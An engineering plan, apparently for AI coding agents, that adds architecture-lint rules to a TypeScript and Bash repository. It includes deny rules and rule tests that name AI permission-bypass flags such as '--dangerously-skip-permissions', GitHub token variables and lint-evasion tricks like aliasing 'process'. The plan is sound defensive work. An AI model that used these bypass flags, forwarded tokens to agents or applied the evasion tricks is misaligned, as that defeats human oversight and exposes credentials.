# Wave 1a-arch — Architecture Fitness Everywhere Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend the architecture fitness functions in `bun run arch` from `src/` to everything that runs: enforce F9 (no GitHub token, no permission bypass) now, close F5 evasion holes, require a rule test and a fix-naming message for every rule, ratchet the bash debt in `scripts/` (F9, F10, F11) and the dashboard's subprocess sprawl (F12), give the dashboard its own layering rules, and generate the import graph as documentation.

**Architecture:** ast-grep rules stay one YAML file per rule in `tools/arch/rules` with a rule test in `tools/arch/rule-tests`. Bash uses ast-grep's built-in `Bash` grammar; three shared util rules live in `tools/arch/utils`. A rule that existing code violates is a **ratchet**: `severity: off` plus `metadata: { ratchet: true }`, so `ast-grep scan` ignores it and `tools/arch/findings-ratchet.ts` counts its findings per rule and file against `tools/arch/findings-baseline.json` (counts may only go down; stale or loose entries fail, as in the F7 size ratchet). The dashboard gets a second dependency-cruiser config. `tools/arch/meta.test.ts` checks every rule file through a shared loader, `tools/arch/rule-catalog.ts`, which the ratchet also uses. `bun run docs:gen` also writes `docs/reference/dependency-graph.md` (mermaid, from the dependency-cruiser API). ADR-0008 records the approach.

**Tech Stack:** Bun 1.2.19, TypeScript (strict), `@ast-grep/cli` 0.50.0 (TypeScript and Bash grammars), dependency-cruiser 18.6.0, Biome 2, `yaml`.

**Spec:** `docs/superpowers/specs/2026-10-13-shipwright-ts-migration-design.md` §3.3 · the Wave 1a plan `docs/superpowers/plans/2026-10-14-wave-1a-safety.md` (Tasks 3, 14, 15, 17) · `AGENTS.md`.

**Prerequisite:** Wave 1a Tasks 14–17 are committed on `wave1/safety`. This plan relies on `tools/arch/workflow-fail-closed.ts` in the `arch` script (Task 14), the `dashboard-no-shell-from-data` rule with its test (Task 15, the spec's interim "no template-literal or concatenated command strings" rule, which this plan reuses rather than duplicates), and ADR-0007 with its edits to `AGENTS.md` and `docs/architecture.md` (Task 17). The doc edits below replace whole sections, so they apply on top of Task 17's wording.

**Not in this plan:** fixing the ratcheted bash or `server.ts` findings (they shrink as commands are ported); a workflow-file F9 check (the workflows contain none of the names today); data-flow analysis.

---

## Decisions this plan takes (recorded in ADR-0008, Task 7)

| Topic | Decision |
|---|---|
| Numbering | F9 is enforced. F10 gains a bash ratchet. New: **F11 bash safety** and **F12 dashboard boundaries**. The dashboard's dependency-cruiser rules are D1–D4 inside F12. Dashboard ast-grep rules keep the `dashboard-` id prefix (Wave 1a's `dashboard-no-shell-from-data` sets it); their messages start `Dashboard:`. |
| Ratchet over warnings | Every new rule that the current code violates is a ratchet, never a warning. A warning trains agents to ignore output; a ratchet blocks new debt and lets the baseline shrink. |
| One generic ratchet | `findings-ratchet.ts` runs every rule marked `metadata: { ratchet: true }` and counts per rule × file. Its contract matches `size-ratchet.ts`: a new file or a higher count fails, a lower count fails until the baseline is tightened, a stale entry fails. `--write-baseline` refuses to raise a count or add a file to a rule it already knows, and seeds only a rule it has never seen. |
| GitHub writes from bash | Inventory at `afb5f2647`: 81 `gh` write calls in 31 scripts, too broad for an allowlist, so `F10-bash-github-writes` is a ratchet. `scripts/lib/safety-gates.sh` (Wave 1a's gated `patrol_issue_create`) is one of the baselined files. |
| F9 scope | Banned anywhere in `src/**` and `dashboard/**` except `*.test.ts` and `src/adapters/github/**` (where `gh` authenticates; it never builds an agent's env): the bypass spellings and the names `GH_TOKEN`, `GITHUB_TOKEN`, `GH_ENTERPRISE_TOKEN`, `GITHUB_ENTERPRISE_TOKEN` as strings, identifiers and keys. Nothing in `src/` or `dashboard/` uses them today. |
| F5 evasion | Bare `Bun`, `process` and `globalThis` used as values (aliasing, call arguments, computed `globalThis["process"]`) are banned outside the I/O allowlist; members (`process.argv`, `globalThis.structuredClone`) and type positions (`typeof Bun`, `Bun.Subprocess`) are not. `os`/`node:os` joins the I/O module list (homedir, userInfo, hostname read the machine). Only `src/testing/test-env.ts` imports it, and `src/testing` is exempt. |
| Dashboard subprocesses | Allowlist: `dashboard/services/claims.ts` and `dashboard/services/subprocess-guards.ts`. `server.ts` (14 findings: the `child_process` import and 13 calls) is ratcheted until Wave 3. |
| Dropped as infeasible | A **workflow** F9 check: ast-grep's YAML grammar adds little over a text search, and the workflows contain none of the names. Revisit if one appears. Taint tracking for bash (data reaching a shell through a file or function argument) cannot be done syntactically and is left to review and porting. |

## Conventions for every task

- Run commands from the worktree root, `/Users/sethford/Documents/shipwright-wave1`.
- Another agent may be committing in this worktree. **Commit only the paths a task names**, with `git commit -m "…" -- <paths>`; never `git add -A .` or `git commit -a`.
- Run `bun run format` before `bun run check`, and stage new files before `bun run check`: the parity sandbox (`tools/port/sandbox.ts`) copies only files in the git index.
- `ast-grep test` silently skips a rule test whose rule does not exist, so a red step for a new rule is a probe scan, not the rule test. Task 3 closes that gap.
- Ratcheted rules are `severity: off`; `ast-grep test` runs them only with `--include-off`, which Task 4 adds to `bun run arch`.

## Dry run

Every task was dry-run on 2026-10-14 in a scratch clone of `wave1/safety` at `afb5f2647` (node_modules symlinked), with Wave 1a Task 15's rule and rule test copied in from its plan, because Tasks 14–17 were still in progress. Each red step failed as stated, each green step passed, and `bun run check` passed after every task. The expected output below is from that run. Ratchet totals are recomputed at execution time against the then-current `HEAD` (Task 4, Step 6), so they may differ slightly from the figures here.

| Measured on the dry run | Before | After |
|---|---|---|
| `bun run arch` | 1.1–1.2 s | 1.9–2.3 s |
| `bun run docs:check` | 0.5 s | 1.1 s |
| `bun run check` | 11.4–12.2 s | 11.8–12.3 s (within noise; about +1.5 s of work, partly parallel) |

---

## File map

| Path | Responsibility |
|---|---|
| `tools/arch/rules/f9-no-agent-privilege.yml` + test | F9 for TypeScript (`src/`, `dashboard/`) |
| `src/adapters/agent/agent-sdk-runner.test.ts` | `agentEnv()` drops every GitHub token |
| `tools/arch/rules/f5-io-only-in-adapters.yml` + test | F5 evasion branches and `node:os` |
| `tools/arch/rules/f6-…`, `f8-…` | Messages start with the rule family |
| `tools/arch/rule-catalog.ts` | Loads rule and rule-test YAML; `isRatcheted` |
| `tools/arch/meta.test.ts` | Every rule has a test, a fix-naming message, and is enforced or ratcheted |
| `sgconfig.yml`, `tools/arch/utils/bash-{expansion,shell,text}.yml` | Bash utils; `scripts/sw` parsed as Bash |
| `tools/arch/rules/f11-bash-no-{eval-expansion,shell-c-expansion,pipe-to-shell,gha-expression}.yml` + tests | F11 (ratcheted) |
| `tools/arch/rules/f9-bash-no-permission-bypass.yml`, `f10-bash-github-writes.yml` + tests | F9 and F10 for bash (ratcheted) |
| `tools/arch/findings-ratchet.ts` + test, `tools/arch/findings-baseline.json` | The generic findings ratchet and its baseline |
| `.dependency-cruiser.dashboard.cjs` | F12 D1–D4: dashboard layering |
| `tools/arch/rules/dashboard-subprocess-only-in-services.yml` + test | F12: subprocess allowlist (ratcheted for `server.ts`) |
| `tools/docs/gen-dependency-graph.ts` + test, `docs/reference/dependency-graph.md` | Generated import graph |
| `package.json` | `arch`, `docs:gen`, `docs:check` |
| `AGENTS.md`, `docs/architecture.md`, spec §3.3, `docs/adr/0008-fitness-functions-everywhere.md` | Guidance and the decision record |

---

### Task 0: Verify the prerequisites and a green base

**Files:** none

- [ ] **Step 1: Confirm the branch, the Wave 1a pieces this plan builds on, and the tool versions**

```bash
git status -sb | head -1
test -f tools/arch/workflow-fail-closed.ts && test -f tools/arch/rules/dashboard-no-shell-from-data.yml \
  && test -f tools/arch/rule-tests/dashboard-no-shell-from-data-test.yml && test -f docs/adr/0007-safety-controls.md \
  && echo "1a prerequisites present"
grep -o 'workflow-injection.ts && bun tools/arch/workflow-fail-closed.ts' package.json
./node_modules/.bin/ast-grep --version
./node_modules/.bin/depcruise --version
```

Expected: `## wave1/safety`, `1a prerequisites present`, the grep prints the fragment, `ast-grep 0.50.0`, `18.6.0`. If a prerequisite is missing, stop: finish Wave 1a Tasks 14–17 first.

- [ ] **Step 2: Run the definition of done and time it**

```bash
time bun run check
```

Expected: passes, ending with `✓ parity hello` and `1/1 parity suites passed`. Note the time; Task 8 compares against it.

---

### Task 1: F9 enforced — no GitHub token and no permission bypass in `src/` and `dashboard/`

**Files:**
- Create: `tools/arch/rules/f9-no-agent-privilege.yml`, `tools/arch/rule-tests/f9-no-agent-privilege-test.yml`
- Modify: `src/adapters/agent/agent-sdk-runner.test.ts`

- [ ] **Step 1: Write the rule test**

`tools/arch/rule-tests/f9-no-agent-privilege-test.yml`:

```yaml
id: F9-no-agent-privilege
valid:
  - 'const options = { permissionMode: "dontAsk", allowedTools: ["Read"] };'
  - 'const env = agentEnv(process.env);'
  - 'const token = env.SHIPWRIGHT_FLEET_TOKEN;'
  - 'const ok = mode === "default";'
invalid:
  - 'const options = { permissionMode: "bypassPermissions" };'
  - 'const options = { allowDangerouslySkipPermissions: true };'
  - 'const argv = ["claude", "-p", prompt, "--dangerously-skip-permissions"];'
  - 'const flag = `--dangerously-skip-permissions`;'
  - 'const mode: PermissionMode = "bypassPermissions";'
  - 'env.GH_TOKEN = token;'
  - 'const env = { GITHUB_TOKEN: source.GITHUB_TOKEN };'
  - 'const t = source["GH_ENTERPRISE_TOKEN"];'
  - 'const keys = ["PATH", "GITHUB_TOKEN"];'
  - 'const { GH_TOKEN } = source;'
```

- [ ] **Step 2: Probe: a bypass in an adapter is not caught yet**

```bash
printf 'export const options = { permissionMode: "bypassPermissions" as const };\n' > src/adapters/agent/zz-probe.ts
./node_modules/.bin/ast-grep scan > /dev/null 2>&1; echo "exit=$?"
```

Expected: `exit=0` (nothing catches it today).

- [ ] **Step 3: Write the rule**

`tools/arch/rules/f9-no-agent-privilege.yml`:

```yaml
# F9: agents get no GitHub token and no permission bypass (spec §3.3).
# Bans the bypass spellings and the GitHub token variable names as strings, identifiers and
# property names anywhere in src/ and dashboard/ (tests excluded, so they can assert the opposite).
# Allowlist: src/adapters/github/** (gh authenticates there; it never builds an agent's env).
# Bash callers are ratcheted by F9-bash-no-permission-bypass.
id: F9-no-agent-privilege
language: TypeScript
severity: error
message: "F9: agents never get a GitHub token or a permission bypass. Use permissionMode \"dontAsk\" with a per-stage allowedTools list, and build the agent env with agentEnv() (src/adapters/agent/agent-sdk-runner.ts); GitHub writes go through GithubWriter."
files:
  - "src/**/*.ts"
  - "dashboard/**/*.ts"
ignores:
  - "**/*.test.ts"
  - "src/adapters/github/**"
rule:
  any:
    - kind: string_fragment
    - kind: identifier
    - kind: property_identifier
    - kind: shorthand_property_identifier
    - kind: shorthand_property_identifier_pattern
  regex: '^(--)?(dangerously-skip-permissions|bypassPermissions|allowDangerouslySkipPermissions|dangerouslySkipPermissions|GH_TOKEN|GITHUB_TOKEN|GH_ENTERPRISE_TOKEN|GITHUB_ENTERPRISE_TOKEN)$'
```

- [ ] **Step 4: Run the rule test and the probe again, then remove the probe**

```bash
./node_modules/.bin/ast-grep test --skip-snapshot-tests 2>&1 | grep -E 'F9|result'
./node_modules/.bin/ast-grep scan 2>&1 | grep '^error'; ./node_modules/.bin/ast-grep scan > /dev/null 2>&1; echo "probe exit=$?"
rm src/adapters/agent/zz-probe.ts
./node_modules/.bin/ast-grep scan > /dev/null 2>&1; echo "clean exit=$?"
```

Expected: `PASS F9-no-agent-privilege  ..............`, `test result: ok. 7 passed; 0 failed;`; the probe reports `error[F9-no-agent-privilege]: F9: agents never get a GitHub token …` and `probe exit=1`; `clean exit=0` (nothing in `src/` or `dashboard/` uses the names).

- [ ] **Step 5: Add the `agentEnv` regression test**

In `src/adapters/agent/agent-sdk-runner.test.ts`, inside `describe("agentEnv", …)`, insert before `test("includes ANTHROPIC_API_KEY only when present", () => {`:

```ts
  test("F9: never forwards a GitHub token, whatever else is set", () => {
    const tokens = ["GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN", "GITHUB_ENTERPRISE_TOKEN"];
    const env = agentEnv({
      PATH: "/bin",
      ANTHROPIC_API_KEY: "k",
      ...Object.fromEntries(tokens.map((t) => [t, "secret"])),
    });
    for (const t of tokens) expect(t in env).toBe(false);
    expect(Object.values(env)).not.toContain("secret");
  });

```

- [ ] **Step 6: Prove the test bites, then restore**

The allowlist already drops the tokens, so this test passes at once. Check that it fails when `agentEnv` leaks:

```bash
sed -i '' 's/^  const env: Record<string, string> = {};/  const env = { ...source } as Record<string, string>;/' src/adapters/agent/agent-sdk-runner.ts
bun test src/adapters/agent/agent-sdk-runner.test.ts -t F9 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
git checkout -- src/adapters/agent/agent-sdk-runner.ts
bun test src/adapters/agent/agent-sdk-runner.test.ts 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
```

Expected: `0 pass` / `1 fail` with the mutation; after the restore, `0 fail` (53 pass on the dry run).

- [ ] **Step 7: Run the definition of done**

```bash
bun run format && git add tools/arch/rules/f9-no-agent-privilege.yml tools/arch/rule-tests/f9-no-agent-privilege-test.yml src/adapters/agent/agent-sdk-runner.test.ts && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 8: Commit**

```bash
git commit -m "feat(arch): enforce F9 — no GitHub token or permission bypass in src and dashboard" -- \
  tools/arch/rules/f9-no-agent-privilege.yml tools/arch/rule-tests/f9-no-agent-privilege-test.yml \
  src/adapters/agent/agent-sdk-runner.test.ts
```

---

### Task 2: F5 evasion hardening

**Files:**
- Modify: `tools/arch/rules/f5-io-only-in-adapters.yml`, `tools/arch/rule-tests/f5-io-only-in-adapters-test.yml`

- [ ] **Step 1: Add the evasion cases to the rule test**

In `tools/arch/rule-tests/f5-io-only-in-adapters-test.yml`, after the valid case `- 'const b = notBun.spawn(["ls"]);'` insert:

```yaml
  # Type positions and harmless globalThis members
  - 'type B = typeof Bun;'
  - 'type G = typeof globalThis;'
  - 'const clone = globalThis.structuredClone;'
  - 'const argv = process.argv;'
  - 'import type { UserInfo } from "node:os";'
```

and append at the end of the file (still under `invalid:`):

```yaml
  # Evasion: aliasing a global, computed access, and the os module
  - 'const b = Bun;'
  - 'const run = (Bun as any).spawn;'
  - 'use(Bun);'
  - 'const p = process;'
  - 'const g = globalThis;'
  - 'const { process: p } = globalThis;'
  - 'const e = globalThis["process"];'
  - "const b = globalThis['Bun'];"
  - 'const x = globalThis[name];'
  - 'import { homedir } from "node:os";'
  - 'import { userInfo } from "os";'
  - 'import * as os from "node:os";'
  - 'const os = require("os");'
  - 'const os = await import("node:os");'
```

- [ ] **Step 2: Run it to see it fail**

```bash
./node_modules/.bin/ast-grep test --skip-snapshot-tests 2>&1 | grep -E '^(PASS|FAIL) F5'
```

Expected: `FAIL F5-io-only-in-adapters  .............Pass × 54, Missing × 14..............`

- [ ] **Step 3: Replace the rule**

`tools/arch/rules/f5-io-only-in-adapters.yml` (the new pieces: the first `any` branch, `os` in the three module regexes, and the `F5:` message prefix that Task 3 requires):

```yaml
id: F5-io-only-in-adapters
language: TypeScript
severity: error
message: "F5: I/O belongs in src/adapters. Define a port in the context and inject an adapter from main.ts."
files:
  - "src/**/*.ts"
ignores:
  - "src/adapters/**"
  - "src/testing/**"
  - "src/main.ts"
  - "src/cli.ts"
  - "src/**/*.test.ts"
# Module specifiers that grant I/O. Keep the three copies of this regex below in sync.
#   bun | bun:sqlite | (node:)?fs | fs/promises | child_process | net | http | https | dns | tls
#   | dgram | http2 | worker_threads | process | os (homedir, userInfo, hostname read the machine)
rule:
  any:
    # A bare `Bun`, `process` or `globalThis` used as a value (aliasing, call arguments, computed
    # access such as globalThis["process"]) would bypass the member checks below. Using them as the
    # object of a member expression (Bun.x, process.argv, globalThis.structuredClone) and type
    # positions (typeof Bun) are handled by the other branches or allowed.
    - all:
        - kind: identifier
          regex: '^(Bun|process|globalThis)$'
        - not: { inside: { kind: member_expression, field: object } }
        - not: { inside: { kind: nested_type_identifier } }
        - not: { inside: { kind: type_query, stopBy: end } }
    # Every runtime member of the Bun global (Bun.spawn, Bun.$, Bun.file, Bun.env, ...).
    # Type positions (`Bun.Subprocess`, `typeof Bun.spawn`) are not member expressions at runtime.
    - all:
        - kind: member_expression
        - has:
            field: object
            any:
              - regex: '^Bun$'
                kind: identifier
              - pattern: globalThis.Bun
        - not:
            inside:
              kind: type_query
              stopBy: end
    - pattern: const { $$$ } = Bun
    - pattern: let { $$$ } = Bun
    - pattern: var { $$$ } = Bun
    - pattern: fetch($$$)
    - pattern: globalThis.fetch($$$)
    - pattern: globalThis.process
    - pattern: process.env
    - pattern: process["env"]
    - pattern: process['env']
    - pattern: const { $$$ } = process
    - pattern: let { $$$ } = process
    - pattern: var { $$$ } = process
    - all:
        - any:
            - pattern: import($S)
            - pattern: require($S)
        - has:
            field: arguments
            kind: arguments
            has:
              kind: string
              regex: '^["''](bun|bun:sqlite|(node:)?(fs|fs/promises|child_process|net|http|https|dns|tls|dgram|http2|worker_threads|process|os))["'']$'
    - all:
        - any:
            - kind: import_statement
            - kind: export_statement
        - has:
            field: source
            kind: string
            regex: '^["''](bun|bun:sqlite|(node:)?(fs|fs/promises|child_process|net|http|https|dns|tls|dgram|http2|worker_threads|process|os))["'']$'
        - not:
            regex: '^(import|export)\s+type\s'
    - kind: import_require_clause
      has:
        field: source
        kind: string
        regex: '^["''](bun|bun:sqlite|(node:)?(fs|fs/promises|child_process|net|http|https|dns|tls|dgram|http2|worker_threads|process|os))["'']$'
```

- [ ] **Step 4: Run the rule test, then probe each evasion in a domain file**

```bash
./node_modules/.bin/ast-grep test --skip-snapshot-tests 2>&1 | grep -E 'F5|result'
./node_modules/.bin/ast-grep scan 2>&1 | grep -c '^error'
for probe in 'const b = Bun; export const f = () => b.spawn(["ls"]);' \
             'export const e = globalThis["process"];' \
             'import { homedir } from "node:os"; export const h = homedir();'; do
  echo "$probe" > src/contexts/platform/domain/zz-probe.ts
  ./node_modules/.bin/ast-grep scan > /dev/null 2>&1; echo "exit=$?"
done
rm src/contexts/platform/domain/zz-probe.ts
```

Expected: `PASS F5-io-only-in-adapters  ....................Pass × 68.....................` and `test result: ok. 7 passed; 0 failed;`; `0` errors on the real tree (nothing legitimate fires); `exit=1` three times.

- [ ] **Step 5: Run the definition of done**

```bash
bun run format && git add tools/arch/rules/f5-io-only-in-adapters.yml tools/arch/rule-tests/f5-io-only-in-adapters-test.yml && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 6: Commit**

```bash
git commit -m "feat(arch): F5 catches aliased globals, computed globalThis access and node:os" -- \
  tools/arch/rules/f5-io-only-in-adapters.yml tools/arch/rule-tests/f5-io-only-in-adapters-test.yml
```

---

### Task 3: Meta-rules — every rule has a test and a message naming the fix

**Files:**
- Create: `tools/arch/rule-catalog.ts`, `tools/arch/meta.test.ts`
- Modify: `tools/arch/rules/f6-agent-sdk-only-in-adapter.yml`, `tools/arch/rules/f8-tests-no-real-home.yml`

- [ ] **Step 1: Write the meta-test**

`tools/arch/meta.test.ts`:

```ts
import { describe, expect, test } from "bun:test";
import { isRatcheted, loadRules, loadRuleTests, type RuleDoc } from "./rule-catalog";

const rules = await loadRules();
const tests = await loadRuleTests();
const testFor = (id: string) => tests.filter((t) => t.id === id);
// A fix names an action. Extend the list when a new rule needs another verb.
const FIX_VERB =
  /\b(use|move|add|pass|call|run|define|inject|split|fix|keep|port|download|replace|remove|build)\b/i;
/** "F10-github-writes-…" → "f10"; "dashboard-no-shell-…" → "dashboard". */
const family = (r: RuleDoc) => r.id.split("-")[0]?.toLowerCase() ?? "";

describe("every fitness rule", () => {
  test("rule ids are unique", () => {
    const ids = rules.map((r) => r.id);
    expect(ids.length).toBeGreaterThan(0);
    expect(new Set(ids).size).toBe(ids.length);
  });

  for (const rule of rules) {
    describe(rule.id, () => {
      test("has exactly one rule test with at least one valid and one invalid case", () => {
        const found = testFor(rule.id);
        expect(found.map((t) => t.file)).toHaveLength(1);
        expect(found[0]?.valid?.length ?? 0).toBeGreaterThan(0);
        expect(found[0]?.invalid?.length ?? 0).toBeGreaterThan(0);
      });

      test("message starts with its rule family and names a fix", () => {
        const message = rule.message ?? "";
        expect(message.toLowerCase().startsWith(`${family(rule)}:`)).toBe(true);
        expect(message).toMatch(FIX_VERB);
      });

      test("is either enforced (error) or ratcheted (off with metadata.ratchet)", () => {
        expect(rule.severity === "error" || isRatcheted(rule)).toBe(true);
      });
    });
  }
});

test("every rule test belongs to a rule (ast-grep silently skips orphans)", () => {
  const ids = new Set(rules.map((r) => r.id));
  expect(tests.filter((t) => !ids.has(t.id)).map((t) => t.file)).toEqual([]);
});
```

- [ ] **Step 2: Run it to see it fail**

```bash
bun test tools/arch/meta.test.ts 2>&1 | grep -E 'error:|^\s*[0-9]+ (pass|fail)'
```

Expected: `error: Cannot find module './rule-catalog'`, `1 fail`.

- [ ] **Step 3: Write the shared loader**

`tools/arch/rule-catalog.ts` (Task 4's ratchet reuses it):

```ts
import { join, resolve } from "node:path";
import { Glob } from "bun";
import { parse } from "yaml";

export const ROOT = resolve(import.meta.dir, "../..");
const RULES_DIR = "tools/arch/rules";
const RULE_TESTS_DIR = "tools/arch/rule-tests";

/** One ast-grep rule file in tools/arch/rules. */
export interface RuleDoc {
  readonly file: string;
  readonly id: string;
  readonly severity?: string;
  readonly message?: string;
  readonly metadata?: { readonly ratchet?: boolean };
}
/** One ast-grep rule-test file in tools/arch/rule-tests. */
export interface RuleTestDoc {
  readonly file: string;
  readonly id: string;
  readonly valid?: readonly string[];
  readonly invalid?: readonly string[];
}

async function loadDir<T>(dir: string, root: string): Promise<(T & { file: string })[]> {
  const out: (T & { file: string })[] = [];
  for await (const name of new Glob("*.{yml,yaml}").scan(join(root, dir))) {
    const file = `${dir}/${name}`;
    out.push({ ...(parse(await Bun.file(join(root, file)).text()) as T), file });
  }
  return out.sort((a, b) => a.file.localeCompare(b.file));
}

export const loadRules = (root = ROOT) => loadDir<RuleDoc>(RULES_DIR, root);
export const loadRuleTests = (root = ROOT) => loadDir<RuleTestDoc>(RULE_TESTS_DIR, root);

/** Ratcheted rules are off for `ast-grep scan`; tools/arch/findings-ratchet.ts counts them instead. */
export const isRatcheted = (r: RuleDoc): boolean =>
  r.severity === "off" && r.metadata?.ratchet === true;
```

- [ ] **Step 4: Run the meta-test; two existing messages do not name their rule**

```bash
bun test tools/arch/meta.test.ts 2>&1 | grep -E '\(fail\)|^\s*[0-9]+ (pass|fail)'
```

Expected:

```text
(fail) every fitness rule > F6-agent-sdk-only-in-adapter > message starts with its rule family and names a fix
(fail) every fitness rule > F8-tests-no-real-home > message starts with its rule family and names a fix
 21 pass
 2 fail
```

(F5's message already gained its prefix in Task 2.)

- [ ] **Step 5: Prefix the two messages**

In `tools/arch/rules/f6-agent-sdk-only-in-adapter.yml` replace `message: "Use the AgentRunner port.` with `message: "F6: Use the AgentRunner port.`. In `tools/arch/rules/f8-tests-no-real-home.yml` replace `message: "Tests must use createTestEnv()` with `message: "F8: Tests must use createTestEnv()`.

- [ ] **Step 6: Run it again, and prove the orphan check**

```bash
bun test tools/arch/meta.test.ts 2>&1 | grep -E '^\s*[0-9]+ (pass|fail)'
sed 's/^id: .*/id: ZZ-orphan/' tools/arch/rule-tests/f6-agent-sdk-only-in-adapter-test.yml > tools/arch/rule-tests/zz-orphan-test.yml
bun test tools/arch/meta.test.ts 2>&1 | grep '(fail)'
rm tools/arch/rule-tests/zz-orphan-test.yml
```

Expected: `23 pass` / `0 fail` (7 rules × 3 checks + 2); then `(fail) every rule test belongs to a rule (ast-grep silently skips orphans)`.

- [ ] **Step 7: Run the definition of done**

```bash
bun run format && git add tools/arch/rule-catalog.ts tools/arch/meta.test.ts tools/arch/rules/f6-agent-sdk-only-in-adapter.yml tools/arch/rules/f8-tests-no-real-home.yml && bun run check
```

Expected: passes; the last lines are `✓ parity hello` and `1/1 parity suites passed`.

- [ ] **Step 8: Commit**

```bash
git commit -m "test(arch): meta-rules — every rule has a rule test and a message naming the fix" -- \
  tools/arch/rule-catalog.ts tools/arch/meta.test.ts \
  tools/arch/rules/f6-agent-sdk-only-in-adapter.yml tools/arch/rules/f8-tests-no-real-home.yml
```

---

### Task 4: Bash fitness (F9, F10, F11) with a findings ratchet

**Files:**
- Create: `tools/arch/findings-ratchet.ts`, `tools/arch/findings-ratchet.test.ts`, `tools/arch/findings-baseline.json` (generated), `tools/arch/utils/bash-expansion.yml`, `tools/arch/utils/bash-shell.yml`, `tools/arch/utils/bash-text.yml`, and six rules with their tests: `f11-bash-no-eval-expansion`, `f11-bash-no-shell-c-expansion`, `f11-bash-no-pipe-to-shell`, `f11-bash-no-gha-expression`, `f9-bash-no-permission-bypass`, `f10-bash-github-writes`
- Modify: `sgconfig.yml`, `package.json`

ast-grep 0.50.0 parses bash with its built-in `Bash` grammar (verified with `ast-grep run -l bash --debug-query=cst`). Grammar facts the rules rely on: a command's words are `argument` children, but `has: { field: argument }` sees only the **first** argument (a repeated field resolves to its first child), so the rules use plain `has`. `$x`, `${x}` and `$(…)` are `simple_expansion`, `expansion` and `command_substitution`, nested inside `string` for `"…"`. `'…'` is an opaque `raw_string`, and a heredoc body is one `heredoc_body` node. `${{` does not parse as an expansion: it appears inside a `word`, a `string_content`, a `raw_string`, a `heredoc_body` or an `ERROR` node.

- [ ] **Step 1: Write the ratchet's unit test**

`tools/arch/findings-ratchet.test.ts`:

```ts
import { expect, test } from "bun:test";
import {
  checkFindings,
  countFindings,
  type Finding,
  nextFindingsBaseline,
  parseScan,
} from "./findings-ratchet";

const f = (ruleId: string, file: string, line = 1): Finding => ({
  ruleId,
  file,
  line,
  message: `${ruleId} message`,
});
const current = countFindings([f("R1", "a.sh"), f("R1", "a.sh", 9), f("R2", "b.sh")]);

test("counts findings per rule and file", () => {
  expect(current).toEqual({ R1: { "a.sh": 2 }, R2: { "b.sh": 1 } });
});

test("parses ast-grep --json=stream output (lines are 0-based there)", () => {
  const line = JSON.stringify({
    ruleId: "R1",
    file: "a.sh",
    range: { start: { line: 4, column: 0 } },
    message: "m",
  });
  expect(parseScan(`${line}\n\n`)).toEqual([{ ruleId: "R1", file: "a.sh", line: 5, message: "m" }]);
});

test("matching counts pass; new files and growth fail", () => {
  expect(checkFindings(current, { R1: { "a.sh": 2 }, R2: { "b.sh": 1 } })).toEqual([]);
  expect(checkFindings(current, { R1: { "a.sh": 2 } })).toEqual([
    "R2 b.sh: 1 new finding(s). Fix them: baselined findings may only go down.",
  ]);
  expect(checkFindings(current, { R1: { "a.sh": 1 }, R2: { "b.sh": 1 } })).toEqual([
    "R1 a.sh: 2 findings (baseline 1). Fix the new one: baselined findings may only go down.",
  ]);
});

test("loose and stale entries fail so the baseline tracks reality", () => {
  expect(checkFindings(current, { R1: { "a.sh": 3 }, R2: { "b.sh": 1, "gone.sh": 4 } })).toEqual([
    "tighten baseline R1 a.sh to 2",
    "remove baseline entry R2 gone.sh (no findings left)",
  ]);
});

test("write mode seeds everything, or a rule the baseline does not know yet", () => {
  expect(nextFindingsBaseline(current, undefined)).toEqual({ baseline: current });
  expect(nextFindingsBaseline(current, { R1: { "a.sh": 2 } })).toEqual({ baseline: current });
});

test("write mode refuses new files and raised counts, but tightens and prunes", () => {
  expect(nextFindingsBaseline(current, { R1: { "z.sh": 1 }, R2: { "b.sh": 1 } })).toEqual({
    errors: ["refusing to baseline new finding R1 a.sh (2)"],
  });
  expect(nextFindingsBaseline(current, { R1: { "a.sh": 1 }, R2: { "b.sh": 1 } })).toEqual({
    errors: ["refusing to raise baseline R1 a.sh from 1 to 2"],
  });
  expect(
    nextFindingsBaseline(countFindings([f("R1", "a.sh")]), { R1: { "a.sh": 2, "gone.sh": 1 } }),
  ).toEqual({ baseline: { R1: { "a.sh": 1 } } });
});
```

- [ ] **Step 2: Run it to see it fail**

```bash
bun test tools/arch/findings-ratchet.test.ts 2>&1 | grep -E 'error:|^\s*[0-9]+ (pass|fail)'
```

Expected: `error: Cannot find module './findings-ratchet'`, `1 fail`.

- [ ] **Step 3: Write the ratchet**

`tools/arch/findings-ratchet.ts`:

```ts
import { join } from "node:path";
import { isRatcheted, loadRules, ROOT } from "./rule-catalog";

const BASELINE = join(ROOT, "tools/arch/findings-baseline.json");
// Each ratcheted rule's own `files` globs pick its files; these are only the roots to walk.
const SCAN_PATHS = ["scripts", "dashboard"];

/** rule id → file → number of findings. */
export type Counts = Record<string, Record<string, number>>;
export interface Finding {
  readonly ruleId: string;
  readonly file: string;
  readonly line: number;
  readonly message: string;
}
type Entry = [rule: string, file: string, count: number];

function sorted(c: Counts): Counts {
  const out: Counts = {};
  for (const rule of Object.keys(c).sort()) {
    const files = c[rule] ?? {};
    const byFile: Record<string, number> = {};
    for (const file of Object.keys(files).sort()) byFile[file] = files[file] ?? 0;
    if (Object.keys(byFile).length > 0) out[rule] = byFile;
  }
  return out;
}

const entries = (c: Counts): Entry[] =>
  Object.entries(sorted(c)).flatMap(([rule, files]) =>
    Object.entries(files).map(([file, n]): Entry => [rule, file, n]),
  );

export function countFindings(findings: readonly Finding[]): Counts {
  const out: Counts = {};
  for (const f of findings) {
    const byFile = out[f.ruleId] ?? {};
    byFile[f.file] = (byFile[f.file] ?? 0) + 1;
    out[f.ruleId] = byFile;
  }
  return sorted(out);
}

/** Parses `ast-grep scan --json=stream` (one match per line; lines are 0-based there). */
export function parseScan(stdout: string): Finding[] {
  return stdout
    .split("\n")
    .filter((l) => l.trim() !== "")
    .map((l) => {
      const m = JSON.parse(l) as {
        ruleId: string;
        file: string;
        range: { start: { line: number } };
        message: string;
      };
      return { ruleId: m.ruleId, file: m.file, line: m.range.start.line + 1, message: m.message };
    });
}

/** Entries that are new or above their baseline, with the baseline value (if any). */
